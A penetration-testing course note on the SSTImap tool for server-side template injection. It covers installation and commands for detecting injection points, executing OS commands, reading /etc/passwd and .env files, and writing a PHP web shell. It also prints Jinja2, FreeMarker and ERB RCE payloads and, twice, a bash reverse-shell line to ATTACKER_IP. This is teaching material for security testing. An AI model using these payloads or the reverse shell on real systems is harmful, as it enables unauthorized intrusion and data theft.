---
tags: [vapt, ssti, tools, intermediate]
difficulty: intermediate
module: "09 - SSTI"
topic: "09.10 SSTImap Tool Usage"
---

# 09.10 — SSTImap Tool Usage

## What is SSTImap?

SSTImap is an automated SSTI detection and exploitation tool — the "sqlmap of SSTI." It detects vulnerable parameters, identifies the template engine, and exploits it to achieve RCE.

```
WHAT IT DOES:
  1. Detects SSTI in GET/POST/Cookie/Header parameters
  2. Identifies the template engine (Jinja2, Twig, FreeMarker, etc.)
  3. Reads files from the server
  4. Executes OS commands
  5. Opens a shell
  6. Performs blind detection (time-based)
```

---

## Installation

```bash
# CLONE:
git clone https://github.com/vladko312/SSTImap
cd SSTImap

# INSTALL DEPENDENCIES:
pip3 install -r requirements.txt

# TEST RUN:
python3 sstimap.py --help
```

---

## Basic Usage

```bash
# SCAN A URL (GET parameter):
python3 sstimap.py -u "https://target.com/page?name=test"
# SSTImap tests all GET parameters for SSTI

# SPECIFY INJECTION POINT WITH *:
python3 sstimap.py -u "https://target.com/page?name=*"
# * marks where to inject

# SCAN POST REQUEST:
python3 sstimap.py -u "https://target.com/submit" \
  --data "name=test&message=hello"

# SPECIFY POST INJECTION POINT:
python3 sstimap.py -u "https://target.com/submit" \
  --data "name=*&message=hello"

# MULTIPLE PARAMETERS:
python3 sstimap.py -u "https://target.com/page?a=*&b=*"
```

---

## Authentication

```bash
# WITH SESSION COOKIE:
python3 sstimap.py -u "https://target.com/profile?name=test" \
  --cookie "session=abc123"

# WITH BEARER TOKEN:
python3 sstimap.py -u "https://target.com/api/profile?name=test" \
  --header "Authorization: Bearer TOKEN123"

# WITH MULTIPLE HEADERS:
python3 sstimap.py -u "https://target.com/page?name=test" \
  --header "Authorization: Bearer TOKEN" \
  --header "X-Custom-Header: Value"

# WITH HTTP BASIC AUTH:
python3 sstimap.py -u "https://user:password@target.com/page?name=test"
```

---

## Exploitation Features

```bash
# RUN OS COMMAND:
python3 sstimap.py -u "https://target.com/page?name=*" \
  --os-cmd "id"

# READ A FILE:
python3 sstimap.py -u "https://target.com/page?name=*" \
  --file-read "/etc/passwd"

# WRITE A FILE:
python3 sstimap.py -u "https://target.com/page?name=*" \
  --file-write "/var/www/html/shell.php" \
  --from-file "/tmp/shell.php"

# OPEN INTERACTIVE SHELL:
python3 sstimap.py -u "https://target.com/page?name=*" \
  --os-shell

# REVERSE SHELL:
python3 sstimap.py -u "https://target.com/page?name=*" \
  --os-shell
# Then type: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

## Advanced Options

```bash
# SET TEMPLATE ENGINE (skip auto-detection):
python3 sstimap.py -u "https://target.com/page?name=*" \
  --engine Jinja2

# SPECIFY ENGINE LIST:
python3 sstimap.py -u "https://target.com/page?name=*" \
  --engine Jinja2,Twig,FreeMarker

# AVAILABLE ENGINES:
# Jinja2, Mako, Twig, Freemarker, Velocity, Smarty, Pebble,
# Cheetah, Dust, Nunjucks, Pug, doT, Marko, EJS

# BLIND SSTI (time-based):
python3 sstimap.py -u "https://target.com/page?name=*" \
  --level 5   ← higher level = more tests, slower

# VIA PROXY (Burp):
python3 sstimap.py -u "https://target.com/page?name=*" \
  --proxy http://127.0.0.1:8080

# CRAWL AND TEST:
# (SSTImap doesn't crawl — use another tool to find endpoints first)
# Combine with: gau, waybackurls, crawl outputs → feed to SSTImap

# VERBOSE:
python3 sstimap.py -u "https://target.com/page?name=*" -v

# SAVE TO LOG:
python3 sstimap.py -u "https://target.com/page?name=*" -o results.txt
```

---

## Testing HTTP Headers with SSTImap

```bash
# TEST A SPECIFIC HEADER:
python3 sstimap.py -u "https://target.com/page" \
  --header "User-Agent: *"
# * in header value = injection point!

# TEST MULTIPLE HEADERS:
python3 sstimap.py -u "https://target.com/page" \
  --header "User-Agent: *" \
  --header "X-Forwarded-For: *"
```

---

## Manual Workflow + SSTImap Combination

```bash
# STEP 1: QUICK MANUAL CHECK:
curl -s "https://target.com/?name=%7B%7B7*7%7D%7D" | grep "49"
# If 49 found → SSTI confirmed

# STEP 2: LET SSTIMAP DO THE REST:
python3 sstimap.py -u "https://target.com/?name=*" \
  --cookie "session=YOUR_SESSION" \
  --os-shell

# STEP 3: IN THE SHELL:
id
cat /etc/passwd
cat /var/www/html/.env
ls /

# STEP 4: ESCALATE TO INTERACTIVE SHELL:
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

## Reading Burp Request File

```bash
# SAVE REQUEST FROM BURP AS .TXT:
# Right-click in Burp Repeater → Save item → request.txt

# FORMAT OF request.txt:
# GET /page?name=test HTTP/1.1
# Host: target.com
# Cookie: session=abc123
# User-Agent: Mozilla/5.0

# SSTIMAP WITH REQUEST FILE:
python3 sstimap.py -r request.txt
python3 sstimap.py -r request.txt --os-cmd "id"
python3 sstimap.py -r request.txt --file-read "/etc/passwd"
```

---

## SSTImap Output Interpretation

```
SSTIMAP OUTPUT:
  [*] Testing Jinja2 on parameter: name
  [+] SSTI detected with payload: {{7*7}}
  [+] Template engine: Jinja2
  [*] Trying RCE...
  [+] RCE achieved! Running as: www-data
  [*] SSTImap shell> _

WHAT IT MEANS:
  [*] = informational
  [+] = success/finding
  [-] = not vulnerable / no result
  
  "SSTImap shell>" = interactive OS command shell!
  Type any OS command → see output
```

---

## Alternative: Manual Testing Cheat Sheet

```bash
# WHEN SSTIMAP CAN'T BE USED (sensitive engagement):

# JINJA2 DETECTION:
curl -s "https://target.com/?n=%7B%7B7*7%7D%7D" | grep "49"

# JINJA2 CONFIG LEAK:
curl -s -G "https://target.com/page" --data-urlencode "n={{config}}"

# JINJA2 RCE:
curl -s -G "https://target.com/page" --data-urlencode "n={{cycler.__init__.__globals__.os.popen('id').read()}}"

# FREEMARKER RCE:
curl -s -G "https://target.com/page" --data-urlencode 'n=${"freemarker.template.utility.Execute"?new()("id")}'

# ERB RCE:
curl -s -G "https://target.com/page" --data-urlencode 'n=<%= `id` %>'
```

---

## Related Notes
- [[01 - What is SSTI]] — fundamentals
- [[03 - Detecting SSTI]] — manual detection
- [[04 - SSTI in Jinja2]] — Jinja2 payloads for SSTImap
- [[08 - SSTI to RCE Escalation]] — what to do after RCE
- [[09 - SSTI WAF Bypass]] — when SSTImap is blocked
